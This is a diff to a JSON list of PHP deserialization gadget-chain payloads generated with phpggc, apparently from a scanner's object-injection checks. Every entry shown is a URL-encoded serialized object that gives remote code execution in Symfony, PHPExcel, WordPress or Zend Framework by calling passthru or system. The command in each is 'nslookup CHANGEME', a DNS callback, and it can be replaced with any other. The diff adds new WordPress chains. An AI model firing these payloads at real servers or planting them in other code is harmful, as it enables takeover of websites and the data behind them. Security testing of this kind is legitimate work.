+    "payload": "C:67:\"Symfony\\Component\\Security\\Core\\Authentication\\Token\\AnonymousToken\":569:{a:2:{i:0%3BN%3Bi:1%3BO:37:\"Symfony\\Component\\BrowserKit\\Response\":1:{s:46:\"%00Symfony\\Component\\BrowserKit\\Response%00headers\"%3BO:50:\"Symfony\\Component\\Finder\\Iterator\\SortableIterator\":2:{s:60:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00iterator\"%3BO:51:\"Symfony\\Component\\Validator\\ConstraintViolationList\":1:{s:63:\"%00Symfony\\Component\\Validator\\ConstraintViolationList%00violations\"%3Ba:2:{i:0%3Bs:8:\"passthru\"%3Bi:1%3Bs:63:\"nslookup CHANGEME\"%3B}}s:56:\"%00Symfony\\Component\\Finder\\Iterator\\SortableIterator%00sort\"%3Bs:14:\"call_user_func\"%3B}}}}"
+  },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ThinkPHP 5.1.x-5.2.x (1)",
@@ -462,6 +487,18 @@
     "payload": "O:25:\"PHPExcel_Shared_XMLWriter\":1:{s:40:\"%00PHPExcel_Shared_XMLWriter%00_tempFileName\"%3BO:17:\"PHPExcel_RichText\":1:{s:36:\"%00PHPExcel_RichText%00_richTextElements\"%3BO:33:\"Requests_Utility_FilteredIterator\":4:{i:0%3Bi:0%3Bi:1%3Ba:1:{i:0%3Bs:63:\"nslookup CHANGEME\"%3B}i:2%3Ba:1:{s:11:\"%00*%00callback\"%3Bs:6:\"system\"%3B}i:3%3BN%3B}}}"
   },
   {
+    "_needs_dynamic_payload_editing": false,
+    "name": "WordPress/RCE1 <= 6.3.1 (1)",
+    "gen_with": "./phpggc WordPress/RCE1 <function> <parameter>",
+    "payload": "O:8:\"WP_Theme\":2:{s:7:\"headers\"%3BO:13:\"WP_Block_List\":2:{s:6:\"blocks\"%3Ba:1:{s:4:\"Name\"%3Ba:1:{s:9:\"blockName\"%3Bs:12:\"Parent+Theme\"%3B}}s:8:\"registry\"%3BO:22:\"WP_Block_Type_Registry\":1:{s:22:\"registered_block_types\"%3BO:8:\"WP_Theme\":2:{s:7:\"headers\"%3BN%3Bs:6:\"parent\"%3BO:22:\"WpOrg\\Requests\\Session\":3:{s:3:\"url\"%3Bs:10:\"http://p:0\"%3Bs:7:\"headers\"%3Ba:1:{i:0%3Bs:63:\"nslookup+CHANGEME\"%3B}s:7:\"options\"%3Ba:1:{s:5:\"hooks\"%3BO:20:\"WpOrg\\Requests\\Hooks\":1:{s:5:\"hooks\"%3Ba:1:{s:23:\"requests.before_request\"%3Ba:1:{i:0%3Ba:1:{i:0%3Ba:2:{i:0%3BO:20:\"WpOrg\\Requests\\Hooks\":1:{s:5:\"hooks\"%3Ba:1:{s:15:\"http://p:0/Name\"%3Ba:1:{i:0%3Ba:1:{i:0%3Bs:8:\"passthru\"%3B}}}}i:1%3Bs:8:\"dispatch\"%3B}}}}}}}}}}s:6:\"parent\"%3BN%3B}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "WordPress/RCE1 6.4.0+ (2)",
+    "gen_with": "./phpggc WordPress/RCE2 <function> <parameter>",
+    "payload": "O:13:\"WP_HTML_Token\":2:{s:13:\"bookmark_name\"%3Bs:63:\"nslookup+CHANGEME\"%3Bs:10:\"on_destroy\"%3Bs:8:\"passthru\"%3B}"
+  },
+  {
     "_needs_dynamic_payload_editing": true,
     "name": "Yii 1.1.20 (2)",
     "gen_with": "./phpggc Yii/RCE2 <function> <parameter>",
@@ -483,7 +520,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework ? <= 1.12.20 (1)",
     "gen_with": "./phpggc ZendFramework/RCE1 <php-code>",
-    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:23:\"Zend_Filter_PregReplace\":2:{s:16:\"%00*%00_matchPattern\"%3Bs:7:\"/(.*)/e\"%3Bs:15:\"%00*%00_replacement\"%3Bs:76:\"passthru('nslookup CHANGEME')%3B\"%3B}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:6:\"layout\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
+    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:23:\"Zend_Filter_PregReplace\":2:{s:16:\"%00*%00_matchPattern\"%3Bs:7:\"/(.*)/e\"%3Bs:15:\"%00*%00_replacement\"%3Bs:76:\"passthru('nslookup+CHANGEME')%3B\"%3B}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:6:\"layout\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -501,7 +538,7 @@
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework ? <= 1.12.20 (4)",
     "gen_with": "./phpggc ZendFramework/RCE4 <code>",
-    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:21:\"Zend_Filter_Inflector\":1:{s:9:\"%00*%00_rules\"%3Ba:1:{s:6:\"script\"%3Ba:1:{i:0%3BO:20:\"Zend_Filter_Callback\":2:{s:12:\"%00*%00_callback\"%3Bs:15:\"create_function\"%3Bs:11:\"%00*%00_options\"%3Ba:1:{i:0%3Bs:0:\"\"%3B}}}}}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:81:\"){}passthru('nslookup CHANGEME')%3B/*\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
+    "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:21:\"Zend_Filter_Inflector\":1:{s:9:\"%00*%00_rules\"%3Ba:1:{s:6:\"script\"%3Ba:1:{i:0%3BO:20:\"Zend_Filter_Callback\":2:{s:12:\"%00*%00_callback\"%3Bs:15:\"create_function\"%3Bs:11:\"%00*%00_options\"%3Ba:1:{i:0%3Bs:0:\"\"%3B}}}}}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:81:\"){}passthru('nslookup+CHANGEME')%3B/*\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
